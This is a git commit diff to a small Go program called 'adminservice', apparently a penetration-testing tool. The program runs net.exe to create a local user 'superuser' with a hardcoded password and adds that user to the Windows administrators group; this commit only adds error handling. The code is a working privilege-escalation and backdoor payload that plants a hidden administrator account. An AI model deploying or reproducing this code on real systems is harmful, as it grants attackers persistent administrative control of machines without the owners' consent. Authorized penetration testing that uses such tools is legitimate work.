4ceca08e8afc575be4822b6682c3c4f211f045aa
arnoudx6 <arnoud.stolk@ziggo.nl>
2022-11-07 19:01:14 +0100

    Final commit

--- adminservice/adminservice.go
+++ adminservice/adminservice.go
@@ -1,19 +1,24 @@
 package main
 
 import (
+	"log"
 	"os/exec"
 	"time"
 )
 
 func main() {
-	const username = "superuser"
-	const password = "Pentest01!!!!"
+	const username string = "superuser"
+	const password string = "Pentest01!!!!"
 
 	println("creating local user")
 
 	//First create the user
 	cmd1 := exec.Command("net.exe", "user", username, password, "/add")
-	cmd1.Run()
+	err1 := cmd1.Run()
+
+	if err1 != nil {
+		log.Fatal(err1)
+	}
 
 	time.Sleep(3 * time.Second)
 
@@ -21,7 +26,11 @@ func main() {
 
 	//Second add the user to the local admins group
 	cmd2 := exec.Command("net.exe", "localgroup", "administrators", username, "/add")
-	cmd2.Run()
+	err2 := cmd2.Run()
+
+	if err2 != nil {
+		log.Fatal(err2)
+	}
 
 	time.Sleep(3 * time.Second)
 }
